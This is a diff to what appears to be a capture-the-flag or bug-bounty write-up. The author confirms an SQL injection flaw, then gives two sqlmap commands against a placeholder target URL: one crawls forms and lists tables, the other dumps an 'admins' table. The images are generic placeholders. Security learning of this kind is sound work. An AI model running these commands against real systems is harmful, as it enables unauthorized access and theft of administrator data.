@@ -8,3 +8,21 @@ The next thing that I checked for was SQL injection. I tested for this with a si
 there was a SQL error that was displayed. 
 
 Its SQL Injection vulnerable!
+
+Now to figure out, how to use SQL Injection to get inforamtion or bypass the authentication...
+
+In order to do this, I launched SQLMap from my Kali machine
+
+`` sqlmap -u [hackeroneurl] --forms --crawl=2 --tables``
+
+![Alt text](https://assets.digitalocean.com/articles/alligator/boo.svg "a title")
+
+In the image above we can see the table named `` admins ``.
+
+In order to enumerate this table, we will need to run the following sqlmap:
+
+`` sqlmap -u [hackeroneurl] --forms --crawl=2 --tables -T admins --dump ``
+
+![Alt text](https://assets.digitalocean.com/articles/alligator/boo.svg "a title")
+
+
